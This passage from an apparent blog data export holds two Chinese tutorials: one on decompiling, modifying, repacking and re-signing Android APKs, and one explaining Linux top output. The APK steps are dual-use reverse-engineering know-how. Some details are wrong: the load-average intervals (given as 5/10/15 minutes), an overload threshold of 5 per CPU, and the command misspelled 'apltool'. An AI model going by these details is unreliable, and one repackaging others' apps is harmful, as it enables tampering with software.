asset_img 3.jpg %}\n\n### 四、修改代码\n\n如果只是修改APK相应的资源，例如图片、字符串比较好办，在res文件夹找到相应的文件替换即可。\n\n修改代码就比较麻烦，因为反编译出来的结果只有smali文件，即java虚拟机支持的汇编语言。如果确实需要修改代码，就得对照smali文件和反编译出来的源码，按照smali规范来改代码，相当于写汇编，所以难度还是比较大的。\n\n### 五、重新打包\n\n修改代码完成后，还需要重新打包以及重新签名。重新打包使用apktool编译修改过的目录即可。\n\n```shell\napltool.bat b -o <output.apk> <input_dir>\n```\n\n### 六、签名\n\n签名是要对发布的apk文件做标记，确保你的apk文件有唯一的身份归属认证，只有相同的签名和相同包名的文件才可以覆盖安装并保留用户信息。\n\n对于反编译的apk，我们可以用java工具jarsigner来对它进行签名。\n\n1、生成keystroe文件\n\n签名需要keystore文件，可以使用keytool工具生成，java环境一般都自带keytool命令，可以直接在命令行中进行测试。\n\n```shell\nkeytool -genkey -alias demo.keystore -keyalg RSA -VALIDITY 40000 -keystore demo.keystore\n```\n\n各个参数意义如下：\n-genkey 产生证书文件\n-alias 产生别名\n-keystore 制定密钥库的.keystore文件\n-keyalg 制定密钥算法 这里指定为RSA 非对称密钥算法\n-validity 证书有效天数\n\n{% asset_img 4.jpg %}\n\n2、签名apk\n\n签名工具使用jarsigner，jarsigner也存在于Java JDK中，所以如果安装好Java环境，可以直接在命令行中使用。\n\n```bash\njarsigner -verbos -keystore <keystore密钥库位置> <待签名的APK>  <密钥库别名>\n```\n\n-verbose 制定生成详细输出\n-keystore 制定数字证书存储路径\n\n这样就完成了对APK的重签名过程，然后就可以安装使用了。如果你的手机上原来就有这个APP，则需要卸载之后重新安装，因为签名已经改变。\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Android-APK-反编译、重打包、签名.md","raw":"---\ntitle: Android APK 反编译、重打包、签名\ndate: 2019-01-10 15:39:34\ntags: ['反编译', 'apktool']\ncategories: \n---\n\n\n首先声明，反编译别人的APK是一件不厚道的事情，本文抱着学习的态度，学习如何使用工具反编译Android APK。\n\n\n### 一、工具\n\n[apktool](https://ibotpeaches.github.io/Apktool/), 编译和反编译apk，提取图片、布局等资源\n[dex2jar](https://github.com/pxb1988/dex2jar/releases)，将可运行文件class.dex反编译为可读的jar源代码\n[jd-gui](http://jd.benow.ca), 查看jar源代码\n\n### 二、反编译\n\n#### 2.1、 apktool安装\n\n**windows下安装**\n\n1、安装java，配置环境变量\n2、下载最新[apktool.bat](https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat)\n3、下载最新[apktool.jar](https://bitbucket.org/iBotPeaches/apktool/downloads/)\n4、将apktool.bat和apktool.jar放在同一目录下，然后就可以在命令行使用了\n\n##### 2.2、 用法\n\n可以直接在命令行执行apktool.bat使用。这里介绍两个最常用的用法。\n\n**反编译**\n\n```shell\napltool.bat d -o <output_dir> test.apk\n```\n其中<output_dir>指定输出目录，默认为apk名称，test.apk为需要反编译的apk\n\n**编译**\n\n```shell\napltool.bat b -o <output.apk> <input_dir>\n```\n其中<input_dir>为上面反编译输出的目录，<output.apk> 是编译输出的apk\n\napktool反编译后的典型目录如下：\n\n{% asset_img 1.jpg %}\n\n此时，可以查看AndroidMainfest.xml、res、smali文件了。甚至可以修改目录下的资源文件或smali文件，然后重新编译打包发布。值得注意的是，apktool反编译出来的是smali文件，即汇编语言版本，并不能查看源代码。\n\n### 三、查看源代码\n\n查看源代码的话，这里需要用到dex2jar、jd-gui这两个工具。\n\n1、将需要反编译的apk后缀改为rar或zip并解压到一个文件夹，得到其中的class.dex\n2、用dex2jar工具反编译class.dex得到jar文件 classes-dex2jar.jar\n\n{% asset_img 2.jpg %}\n\n3、使用jd-gui打开classes-dex2jar.jar，就可以查看源码了，当然如果代码发布的时候做过混淆，我们也只能看到混淆过的代码。所以代码混淆的重要性不言而喻。\n\n{% asset_img 3.jpg %}\n\n### 四、修改代码\n\n如果只是修改APK相应的资源，例如图片、字符串比较好办，在res文件夹找到相应的文件替换即可。\n\n修改代码就比较麻烦，因为反编译出来的结果只有smali文件，即java虚拟机支持的汇编语言。如果确实需要修改代码，就得对照smali文件和反编译出来的源码，按照smali规范来改代码，相当于写汇编，所以难度还是比较大的。\n\n### 五、重新打包\n\n修改代码完成后，还需要重新打包以及重新签名。重新打包使用apktool编译修改过的目录即可。\n\n```shell\napltool.bat b -o <output.apk> <input_dir>\n```\n\n### 六、签名\n\n签名是要对发布的apk文件做标记，确保你的apk文件有唯一的身份归属认证，只有相同的签名和相同包名的文件才可以覆盖安装并保留用户信息。\n\n对于反编译的apk，我们可以用java工具jarsigner来对它进行签名。\n\n1、生成keystroe文件\n\n签名需要keystore文件，可以使用keytool工具生成，java环境一般都自带keytool命令，可以直接在命令行中进行测试。\n\n```shell\nkeytool -genkey -alias demo.keystore -keyalg RSA -VALIDITY 40000 -keystore demo.keystore\n```\n\n各个参数意义如下：\n-genkey 产生证书文件\n-alias 产生别名\n-keystore 制定密钥库的.keystore文件\n-keyalg 制定密钥算法 这里指定为RSA 非对称密钥算法\n-validity 证书有效天数\n\n{% asset_img 4.jpg %}\n\n2、签名apk\n\n签名工具使用jarsigner，jarsigner也存在于Java JDK中，所以如果安装好Java环境，可以直接在命令行中使用。\n\n```bash\njarsigner -verbos -keystore <keystore密钥库位置> <待签名的APK>  <密钥库别名>\n```\n\n-verbose 制定生成详细输出\n-keystore 制定数字证书存储路径\n\n这样就完成了对APK的重签名过程，然后就可以安装使用了。如果你的手机上原来就有这个APP，则需要卸载之后重新安装，因为签名已经改变。\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Android-APK-反编译、重打包、签名","published":1,"updated":"2019-06-26T07:32:03.962Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2g10008o25t7efjs78l","content":"<p>首先声明，反编译别人的APK是一件不厚道的事情，本文抱着学习的态度，学习如何使用工具反编译Android APK。</p>\n<h3 id=\"一、工具\"><a href=\"#一、工具\" class=\"headerlink\" title=\"一、工具\"></a>一、工具</h3><p><a href=\"https://ibotpeaches.github.io/Apktool/\" target=\"_blank\" rel=\"noopener\">apktool</a>, 编译和反编译apk，提取图片、布局等资源<br><a href=\"https://github.com/pxb1988/dex2jar/releases\" target=\"_blank\" rel=\"noopener\">dex2jar</a>，将可运行文件class.dex反编译为可读的jar源代码<br><a href=\"http://jd.benow.ca\" target=\"_blank\" rel=\"noopener\">jd-gui</a>, 查看jar源代码</p>\n<h3 id=\"二、反编译\"><a href=\"#二、反编译\" class=\"headerlink\" title=\"二、反编译\"></a>二、反编译</h3><h4 id=\"2-1、-apktool安装\"><a href=\"#2-1、-apktool安装\" class=\"headerlink\" title=\"2.1、 apktool安装\"></a>2.1、 apktool安装</h4><p><strong>windows下安装</strong></p>\n<p>1、安装java，配置环境变量<br>2、下载最新<a href=\"https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat\" target=\"_blank\" rel=\"noopener\">apktool.bat</a><br>3、下载最新<a href=\"https://bitbucket.org/iBotPeaches/apktool/downloads/\" target=\"_blank\" rel=\"noopener\">apktool.jar</a><br>4、将apktool.bat和apktool.jar放在同一目录下，然后就可以在命令行使用了</p>\n<h5 id=\"2-2、-用法\"><a href=\"#2-2、-用法\" class=\"headerlink\" title=\"2.2、 用法\"></a>2.2、 用法</h5><p>可以直接在命令行执行apktool.bat使用。这里介绍两个最常用的用法。</p>\n<p><strong>反编译</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apltool.bat d -o &lt;output_dir&gt; test.apk</span><br></pre></td></tr></table></figure>\n<p>其中&lt;output_dir&gt;指定输出目录，默认为apk名称，test.apk为需要反编译的apk</p>\n<p><strong>编译</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apltool.bat b -o &lt;output.apk&gt; &lt;input_dir&gt;</span><br></pre></td></tr></table></figure>\n<p>其中&lt;input_dir&gt;为上面反编译输出的目录，&lt;output.apk&gt; 是编译输出的apk</p>\n<p>apktool反编译后的典型目录如下：</p>\n<img src=\"/posts/2019-01-10-Android-APK-反编译、重打包、签名/1.jpg\">\n<p>此时，可以查看AndroidMainfest.xml、res、smali文件了。甚至可以修改目录下的资源文件或smali文件，然后重新编译打包发布。值得注意的是，apktool反编译出来的是smali文件，即汇编语言版本，并不能查看源代码。</p>\n<h3 id=\"三、查看源代码\"><a href=\"#三、查看源代码\" class=\"headerlink\" title=\"三、查看源代码\"></a>三、查看源代码</h3><p>查看源代码的话，这里需要用到dex2jar、jd-gui这两个工具。</p>\n<p>1、将需要反编译的apk后缀改为rar或zip并解压到一个文件夹，得到其中的class.dex<br>2、用dex2jar工具反编译class.dex得到jar文件 classes-dex2jar.jar</p>\n<img src=\"/posts/2019-01-10-Android-APK-反编译、重打包、签名/2.jpg\">\n<p>3、使用jd-gui打开classes-dex2jar.jar，就可以查看源码了，当然如果代码发布的时候做过混淆，我们也只能看到混淆过的代码。所以代码混淆的重要性不言而喻。</p>\n<img src=\"/posts/2019-01-10-Android-APK-反编译、重打包、签名/3.jpg\">\n<h3 id=\"四、修改代码\"><a href=\"#四、修改代码\" class=\"headerlink\" title=\"四、修改代码\"></a>四、修改代码</h3><p>如果只是修改APK相应的资源，例如图片、字符串比较好办，在res文件夹找到相应的文件替换即可。</p>\n<p>修改代码就比较麻烦，因为反编译出来的结果只有smali文件，即java虚拟机支持的汇编语言。如果确实需要修改代码，就得对照smali文件和反编译出来的源码，按照smali规范来改代码，相当于写汇编，所以难度还是比较大的。</p>\n<h3 id=\"五、重新打包\"><a href=\"#五、重新打包\" class=\"headerlink\" title=\"五、重新打包\"></a>五、重新打包</h3><p>修改代码完成后，还需要重新打包以及重新签名。重新打包使用apktool编译修改过的目录即可。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apltool.bat b -o &lt;output.apk&gt; &lt;input_dir&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"六、签名\"><a href=\"#六、签名\" class=\"headerlink\" title=\"六、签名\"></a>六、签名</h3><p>签名是要对发布的apk文件做标记，确保你的apk文件有唯一的身份归属认证，只有相同的签名和相同包名的文件才可以覆盖安装并保留用户信息。</p>\n<p>对于反编译的apk，我们可以用java工具jarsigner来对它进行签名。</p>\n<p>1、生成keystroe文件</p>\n<p>签名需要keystore文件，可以使用keytool工具生成，java环境一般都自带keytool命令，可以直接在命令行中进行测试。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keytool -genkey -alias demo.keystore -keyalg RSA -VALIDITY 40000 -keystore demo.keystore</span><br></pre></td></tr></table></figure>\n<p>各个参数意义如下：<br>-genkey 产生证书文件<br>-alias 产生别名<br>-keystore 制定密钥库的.keystore文件<br>-keyalg 制定密钥算法 这里指定为RSA 非对称密钥算法<br>-validity 证书有效天数</p>\n<img src=\"/posts/2019-01-10-Android-APK-反编译、重打包、签名/4.jpg\">\n<p>2、签名apk</p>\n<p>签名工具使用jarsigner，jarsigner也存在于Java JDK中，所以如果安装好Java环境，可以直接在命令行中使用。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jarsigner -verbos -keystore &lt;keystore密钥库位置&gt; &lt;待签名的APK&gt;  &lt;密钥库别名&gt;</span><br></pre></td></tr></table></figure>\n<p>-verbose 制定生成详细输出<br>-keystore 制定数字证书存储路径</p>\n<p>这样就完成了对APK的重签名过程，然后就可以安装使用了。如果你的手机上原来就有这个APP，则需要卸载之后重新安装，因为签名已经改变。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p>首先声明，反编译别人的APK是一件不厚道的事情，本文抱着学习的态度，学习如何使用工具反编译Android APK。</p>\n<h3 id=\"一、工具\"><a href=\"#一、工具\" class=\"headerlink\" title=\"一、工具\"></a>一、工具</h3><p><a href=\"https://ibotpeaches.github.io/Apktool/\" target=\"_blank\" rel=\"noopener\">apktool</a>, 编译和反编译apk，提取图片、布局等资源<br><a href=\"https://github.com/pxb1988/dex2jar/releases\" target=\"_blank\" rel=\"noopener\">dex2jar</a>，将可运行文件class.dex反编译为可读的jar源代码<br><a href=\"http://jd.benow.ca\" target=\"_blank\" rel=\"noopener\">jd-gui</a>, 查看jar源代码</p>\n<h3 id=\"二、反编译\"><a href=\"#二、反编译\" class=\"headerlink\" title=\"二、反编译\"></a>二、反编译</h3><h4 id=\"2-1、-apktool安装\"><a href=\"#2-1、-apktool安装\" class=\"headerlink\" title=\"2.1、 apktool安装\"></a>2.1、 apktool安装</h4><p><strong>windows下安装</strong></p>\n<p>1、安装java，配置环境变量<br>2、下载最新<a href=\"https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat\" target=\"_blank\" rel=\"noopener\">apktool.bat</a><br>3、下载最新<a href=\"https://bitbucket.org/iBotPeaches/apktool/downloads/\" target=\"_blank\" rel=\"noopener\">apktool.jar</a><br>4、将apktool.bat和apktool.jar放在同一目录下，然后就可以在命令行使用了</p>\n<h5 id=\"2-2、-用法\"><a href=\"#2-2、-用法\" class=\"headerlink\" title=\"2.2、 用法\"></a>2.2、 用法</h5><p>可以直接在命令行执行apktool.bat使用。这里介绍两个最常用的用法。</p>\n<p><strong>反编译</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apltool.bat d -o &lt;output_dir&gt; test.apk</span><br></pre></td></tr></table></figure>\n<p>其中&lt;output_dir&gt;指定输出目录，默认为apk名称，test.apk为需要反编译的apk</p>\n<p><strong>编译</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apltool.bat b -o &lt;output.apk&gt; &lt;input_dir&gt;</span><br></pre></td></tr></table></figure>\n<p>其中&lt;input_dir&gt;为上面反编译输出的目录，&lt;output.apk&gt; 是编译输出的apk</p>\n<p>apktool反编译后的典型目录如下：</p>\n<img src=\"/posts/2019-01-10-Android-APK-反编译、重打包、签名/1.jpg\">\n<p>此时，可以查看AndroidMainfest.xml、res、smali文件了。甚至可以修改目录下的资源文件或smali文件，然后重新编译打包发布。值得注意的是，apktool反编译出来的是smali文件，即汇编语言版本，并不能查看源代码。</p>\n<h3 id=\"三、查看源代码\"><a href=\"#三、查看源代码\" class=\"headerlink\" title=\"三、查看源代码\"></a>三、查看源代码</h3><p>查看源代码的话，这里需要用到dex2jar、jd-gui这两个工具。</p>\n<p>1、将需要反编译的apk后缀改为rar或zip并解压到一个文件夹，得到其中的class.dex<br>2、用dex2jar工具反编译class.dex得到jar文件 classes-dex2jar.jar</p>\n<img src=\"/posts/2019-01-10-Android-APK-反编译、重打包、签名/2.jpg\">\n<p>3、使用jd-gui打开classes-dex2jar.jar，就可以查看源码了，当然如果代码发布的时候做过混淆，我们也只能看到混淆过的代码。所以代码混淆的重要性不言而喻。</p>\n<img src=\"/posts/2019-01-10-Android-APK-反编译、重打包、签名/3.jpg\">\n<h3 id=\"四、修改代码\"><a href=\"#四、修改代码\" class=\"headerlink\" title=\"四、修改代码\"></a>四、修改代码</h3><p>如果只是修改APK相应的资源，例如图片、字符串比较好办，在res文件夹找到相应的文件替换即可。</p>\n<p>修改代码就比较麻烦，因为反编译出来的结果只有smali文件，即java虚拟机支持的汇编语言。如果确实需要修改代码，就得对照smali文件和反编译出来的源码，按照smali规范来改代码，相当于写汇编，所以难度还是比较大的。</p>\n<h3 id=\"五、重新打包\"><a href=\"#五、重新打包\" class=\"headerlink\" title=\"五、重新打包\"></a>五、重新打包</h3><p>修改代码完成后，还需要重新打包以及重新签名。重新打包使用apktool编译修改过的目录即可。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apltool.bat b -o &lt;output.apk&gt; &lt;input_dir&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"六、签名\"><a href=\"#六、签名\" class=\"headerlink\" title=\"六、签名\"></a>六、签名</h3><p>签名是要对发布的apk文件做标记，确保你的apk文件有唯一的身份归属认证，只有相同的签名和相同包名的文件才可以覆盖安装并保留用户信息。</p>\n<p>对于反编译的apk，我们可以用java工具jarsigner来对它进行签名。</p>\n<p>1、生成keystroe文件</p>\n<p>签名需要keystore文件，可以使用keytool工具生成，java环境一般都自带keytool命令，可以直接在命令行中进行测试。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keytool -genkey -alias demo.keystore -keyalg RSA -VALIDITY 40000 -keystore demo.keystore</span><br></pre></td></tr></table></figure>\n<p>各个参数意义如下：<br>-genkey 产生证书文件<br>-alias 产生别名<br>-keystore 制定密钥库的.keystore文件<br>-keyalg 制定密钥算法 这里指定为RSA 非对称密钥算法<br>-validity 证书有效天数</p>\n<img src=\"/posts/2019-01-10-Android-APK-反编译、重打包、签名/4.jpg\">\n<p>2、签名apk</p>\n<p>签名工具使用jarsigner，jarsigner也存在于Java JDK中，所以如果安装好Java环境，可以直接在命令行中使用。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jarsigner -verbos -keystore &lt;keystore密钥库位置&gt; &lt;待签名的APK&gt;  &lt;密钥库别名&gt;</span><br></pre></td></tr></table></figure>\n<p>-verbose 制定生成详细输出<br>-keystore 制定数字证书存储路径</p>\n<p>这样就完成了对APK的重签名过程，然后就可以安装使用了。如果你的手机上原来就有这个APP，则需要卸载之后重新安装，因为签名已经改变。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Linux top 命令详解","date":"2019-02-20T02:33:09.000Z","_content":"\nLinux系统中，top命令经常用来监控Linux的系统状况。可以通过top命令查看系统的CPU、内存、运行时间、线程信息等。通过top命令可以有效分析系统的性能瓶颈在哪里。\n\n## 一、 top命令解释\n\n在Linux系统中执行top命令，就会进入如下界面，下面我们来逐行分析每行代表的意义。\n\n{% asset_img top命令.png %}\n\n### 1、 系统运行时间及平均负载\n\ntop命令的第一行表示的是系统的运行时间及平均负载，与uptime命令有相似的输出。\n\n```shell\n top - 17:05:18 up 190 days,  3:54,  1 user,  load average: 0.00, 0.02, 0.05\n-- 17:05:18            系统的当前时间\n-- up 190 days,  3:54  系统已经运行的时间 190天3小时54分钟，期间没有重启\n-- 1 user              系统当前登录用户数 表示系统当前只有一个用户登录\n-- load average: 0.00, 0.02, 0.05 \n\t\t  \tload average后面的三个数分别是5分钟、10分钟、15分钟的负载情况\t\t\t   \n```\n\nload average数据是每隔5秒钟检查一次活跃的进程数，然后按照特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。\n\n### 2、任务\n\n第二行显示的是任务或者进程的总结。进程可以处于不同的状态，这里显示了全部进程的数量。\n\n```bash\nTasks:   65 total,   1 running,   64 sleeping,   0 stopped,   0 zombie\n# 总共有65个进程，1个正在运行， 64个休眠，0个停止，0个僵尸进程\n```\n\n### 3、CPU状态\n\n```bash\n%Cpu(s):  0.9 us,  1.2 sy,  0.0 ni, 97.6 id,  0.1 wa,  0.0 hi,  0.2 si,  0.0 st\n```\n这里显示的是不同模式下所占CPU时间百分比，不同CPU时间表示：\n* us   user, 运行用户进程的CPU时间，消耗在用户空间的时间\n* sy   system，运行内核进程的CPU时间，即消耗在内核空间的时间\n* ni   niced，运行已调整优先级的用户进程的CPU时间\n* id   idle，空闲CPU百分比，这个值越低，表示cpu越忙\n* wa   wait，用于等待IO完成的CPU时间百分比，这个值越高说明外接设备有问题\n* hi   hardware interrupt，处理硬件中断的CPU时间\n* si   software interrupt，处理软中断的CPU时间\n* st   虚拟机被hypervisor偷去的CPU时间（如果当前处于一个hypervisor的虚拟机，实际上hypervisor也是要消耗一部分CPU时间的）。\n\n在这里CPU的使用比率和windows概念不同，如果你不理解用户空间和内核空间，需要充电了。\n\n\n### 4、内存使用\n\n```bash\nKiB Mem:   2027864 total,  1945796 used,    82068 free,    15064 buffers\nKiB Swap:  1048572 total,    87168 used,   961404 free.   398840 cached Mem\n```\n\n这两行显示的是内存使用率，有点像free命令。第一行是物理内存使用，第二行是虚拟内存使用（交换空间）。\n\n内存显示如下： \n\n|         | 全部可用内存 | 已使用内存 | 空闲内存 | 缓冲内存 |\n|---------|------------|----------- |---------|---------|\n| 物理内存 | 物理内存总量2027864 | 使用中的内存总量1945796 | 空闲内存总量82068 | 缓存的内存量15064 |\n| 交换分区 | 交换分区总量1048572 | 使用的交换分区总量87168 | 空闲交换分区总量961404 | 缓存的交换区总量398840 |\n\n这里要说明的是不能用windows的内存概念理解这些数据，如果按照windows的方式此台服务器“危矣”。\n\n\n对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了。\n\n\n### 5、各进程的状态监控\n\n第六行是空行，第七行开始是个任务的状态监控。\n\n```bash\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                \n    1 root      20   0   54428   5512   3032 S  0.0  0.3  10:29.07 systemd                                \n    2 root      20   0       0      0      0 S  0.0  0.0   0:00.90 kthreadd                               \n    3 root      20   0       0      0      0 S  0.0  0.0   0:25.90 ksoftirqd/0                            \n    5 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker/0:0H                           \n    7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0                            \n    8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh                                 \n    9 root      20   0       0      0      0 S  0.0  0.0   1:22.61 rcu_sched                              \n   10 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 lru-add-drain                          \n   11 root      rt   0       0      0      0 S  0.0  0.0   0:36.39 watchdog/0                             \n   13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs                              \n   14 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns                                  \n   15 root      20   0       0      0      0 S  0.0  0.0   0:01.43 khungtaskd                             \n   16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writeback                              \n   17 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kintegrityd                            \n   18 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 \n   19 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 \n   20 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset                                 \n   21 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kblockd                                \n   22 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 md                                     \n   23 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 edac-poller                            \n   24 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 watchdogd                              \n   30 root      20   0       0      0      0 S  0.0  0.0   0:26.98 kswapd0            \n```\n\nPID:  进程ID，进程的唯一标识\nUSER： 进程所有者的实际用户名\nPR： 进程的调度优先级，这些值中有些是rt，表示这些进程运行在实时态\nNI： 进程的nice值（优先级）越小的值意味着越高的优先级。负值表示高优先级，正值表示低优先级\nVIRT： 进程使用的虚拟内存。进程使用的虚拟内存总量，单位是kb，VIRT=SWAP+RES\nRES: 驻留内存大小，驻留内存是任务使用的非交换物理内存大小。进程使用的、未被换出的物理内存大小，单位是kb，RES=CODE+DATA\nSHR： SHR是进程使用的共享内存。\nS： 这个是进程的状态。它有以下不同的值：\n  * D - 不可中断的睡眠态\n  * R - 运行态\n  * S - 睡眠态\n  * T - 被跟踪或已停止\n  * Z - 僵尸态\n%CPU： 自从上一次更新时到现在任务所使用的CPU时间百分比\n%MEM： 进程使用的可用物理内存百分比\nTIME+： 任务启动后到现在所使用的全部CPU时间，精确到百分之一秒。\nCOMMAND：运行进程所使用的命令。进程名称（命令名/命令行）\n\n还有许多在默认情况下不会显示的输出，他们可以显示进程的页错误、有效组、组ID和其他更多的信息。\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Linux-top-命令详解.md","raw":"---\ntitle: Linux top 命令详解\ndate: 2019-02-20 10:33:09\ntags: ['linux', 'top', '运维', '负载']\ncategories: Linux\n---\n\nLinux系统中，top命令经常用来监控Linux的系统状况。可以通过top命令查看系统的CPU、内存、运行时间、线程信息等。通过top命令可以有效分析系统的性能瓶颈在哪里。\n\n## 一、 top命令解释\n\n在Linux系统中执行top命令，就会进入如下界面，下面我们来逐行分析每行代表的意义。\n\n{% asset_img top命令.png %}\n\n### 1、 系统运行时间及平均负载\n\ntop命令的第一行表示的是系统的运行时间及平均负载，与uptime命令有相似的输出。\n\n```shell\n top - 17:05:18 up 190 days,  3:54,  1 user,  load average: 0.00, 0.02, 0.05\n-- 17:05:18            系统的当前时间\n-- up 190 days,  3:54  系统已经运行的时间 190天3小时54分钟，期间没有重启\n-- 1 user              系统当前登录用户数 表示系统当前只有一个用户登录\n-- load average: 0.00, 0.02, 0.05 \n\t\t  \tload average后面的三个数分别是5分钟、10分钟、15分钟的负载情况\t\t\t   \n```\n\nload average数据是每隔5秒钟检查一次活跃的进程数，然后按照特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。\n\n### 2、任务\n\n第二行显示的是任务或者进程的总结。进程可以处于不同的状态，这里显示了全部进程的数量。\n\n```bash\nTasks:   65 total,   1 running,   64 sleeping,   0 stopped,   0 zombie\n# 总共有65个进程，1个正在运行， 64个休眠，0个停止，0个僵尸进程\n```\n\n### 3、CPU状态\n\n```bash\n%Cpu(s):  0.9 us,  1.2 sy,  0.0 ni, 97.6 id,  0.1 wa,  0.0 hi,  0.2 si,  0.0 st\n```\n这里显示的是不同模式下所占CPU时间百分比，不同CPU时间表示：\n* us   user, 运行用户进程的CPU时间，消耗在用户空间的时间\n* sy   system，运行内核进程的CPU时间，即消耗在内核空间的时间\n* ni   niced，运行已调整优先级的用户进程的CPU时间\n* id   idle，空闲CPU百分比，这个值越低，表示cpu越忙\n* wa   wait，用于等待IO完成的CPU时间百分比，这个值越高说明外接设备有问题\n* hi   hardware interrupt，处理硬件中断的CPU时间\n* si   software interrupt，处理软中断的CPU时间\n* st   虚拟机被hypervisor偷去的CPU时间（如果当前处于一个hypervisor的虚拟机，实际上hypervisor也是要消耗一部分CPU时间的）。\n\n在这里CPU的使用比率和windows概念不同，如果你不理解用户空间和内核空间，需要充电了。\n\n\n### 4、内存使用\n\n```bash\nKiB Mem:   2027864 total,  1945796 used,    82068 free,    15064 buffers\nKiB Swap:  1048572 total,    87168 used,   961404 free.   398840 cached Mem\n```\n\n这两行显示的是内存使用率，有点像free命令。第一行是物理内存使用，第二行是虚拟内存使用（交换空间）。\n\n内存显示如下： \n\n|         | 全部可用内存 | 已使用内存 | 空闲内存 | 缓冲内存 |\n|---------|------------|----------- |---------|---------|\n| 物理内存 | 物理内存总量2027864 | 使用中的内存总量1945796 | 空闲内存总量82068 | 缓存的内存量15064 |\n| 交换分区 | 交换分区总量1048572 | 使用的交换分区总量87168 | 空闲交换分区总量961404 | 缓存的交换区总量398840 